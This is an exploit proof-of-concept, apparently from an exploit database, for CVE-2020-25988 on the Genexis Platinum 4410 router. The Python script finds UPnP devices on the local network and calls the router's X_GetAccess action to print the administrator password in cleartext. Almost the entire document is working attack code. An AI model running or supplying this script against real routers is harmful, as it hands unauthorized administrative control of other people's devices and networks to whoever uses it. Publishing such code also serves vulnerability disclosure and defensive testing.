# Exploit Title: Genexis Platinum 4410 Router 2.1 - UPnP Credential Exposure
# Date: 17th November 2020
# Exploit Author: Nitesh Surana
# Vendor Homepage: https://www.gxgroup.eu/ont-products/
# Version: P4410-V2-1.34H
# Tested on: Windows/Kali
# CVE : CVE-2020-25988

import upnpy

upnp = upnpy.UPnP()

# Discover UPnP devices on the network
# Returns a list of devices e.g.: [Device <Econet IGD>]
devices = upnp.discover()

# Select the device directly from the list
device = devices[0]

# Get the services available for this device
# Returns a list of services available for the device
# device.get_services()

# We can now access a specific service on the device by its ID like a dictionary 
service = device['DeviceInfo1']

# Execute the action by its name (in our case, the 'X_GetAccess' action)
# Returns a dictionary containing the cleartext password of 'admin' user.
print("Admin Password: {}".format(service.X_GetAccess()['NewX_RootPassword']))
